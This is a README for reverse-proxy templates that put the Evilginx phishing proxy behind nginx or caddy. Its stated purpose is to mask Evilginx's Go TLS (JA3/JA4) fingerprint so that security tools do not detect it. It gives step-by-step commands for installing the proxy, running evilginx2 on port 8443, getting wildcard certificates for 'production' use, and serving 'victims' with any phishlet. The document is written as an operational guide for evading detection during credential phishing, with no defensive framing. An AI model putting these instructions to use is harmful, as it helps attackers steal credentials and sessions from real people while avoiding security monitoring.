# Reverse Proxy for JA3/JA4 TLS Fingerprint Evasion

This directory contains configuration templates for nginx/caddy reverse proxy.

## Why Use a Reverse Proxy?

By default, Evilginx uses Go's standard TLS library which has a unique JA3/JA4 fingerprint that can be detected by security tools. Putting Evilginx behind nginx or caddy masks this fingerprint with a more common one.

## Quick Start (Recommended)

Use the main `start.sh` script with the `-reverse` flag:

```bash
# Start with nginx reverse proxy
sudo ./start.sh run -reverse nginx yourdomain.com

# Start with caddy reverse proxy  
sudo ./start.sh run -reverse caddy yourdomain.com

# Normal start (no reverse proxy)
sudo ./start.sh run
```

## How It Works

```
WITHOUT Reverse Proxy:
Victim → Evilginx (port 443)
         ↓
    Go TLS fingerprint (detectable)

WITH Reverse Proxy:
Victim → Nginx/Caddy (port 443) → Evilginx (port 8443)
         ↓
    Nginx/Caddy fingerprint (common, not suspicious)
```

## What the -reverse Flag Does

1. **Installs** nginx or caddy if not present
2. **Generates** SSL certificate (self-signed for nginx, auto for caddy)
3. **Configures** the proxy using templates from this directory
4. **Starts** the proxy service on port 443
5. **Starts** Evilginx on port 8443 (localhost only)

## Configuration Files

- `nginx.conf` - Nginx configuration template
- `Caddyfile` - Caddy configuration template

These are copied to `/etc/nginx/` or `/etc/caddy/` when you use `-reverse`.

## Stopping

```bash
sudo ./start.sh stop
```

This stops both Evilginx AND the reverse proxy.

## Manual Configuration

If you need custom configuration, edit the templates in this directory before running with `-reverse`, or manually configure:

### Nginx
```bash
# Copy and edit config
sudo cp reverse_proxy/nginx.conf /etc/nginx/sites-available/evilginx
sudo nano /etc/nginx/sites-available/evilginx
# Update DOMAIN_NAME and certificate paths

# Enable and start
sudo ln -sf /etc/nginx/sites-available/evilginx /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl restart nginx

# Start evilginx on port 8443
./evilginx2 -p 8443
```

### Caddy
```bash
# Copy and edit config
sudo cp reverse_proxy/Caddyfile /etc/caddy/Caddyfile
sudo nano /etc/caddy/Caddyfile
# Update DOMAIN_NAME

# Start caddy
sudo systemctl restart caddy

# Start evilginx on port 8443
./evilginx2 -p 8443
```

## Production Notes

1. **SSL Certificates**: For production, use Let's Encrypt:
   ```bash
   # Nginx
   sudo certbot certonly --nginx -d '*.yourdomain.com' -d 'yourdomain.com'
   
   # Caddy handles this automatically
   ```

2. **Performance**: Minimal overhead (~1-2ms latency added)

3. **Compatibility**: Works with all phishlets without modification
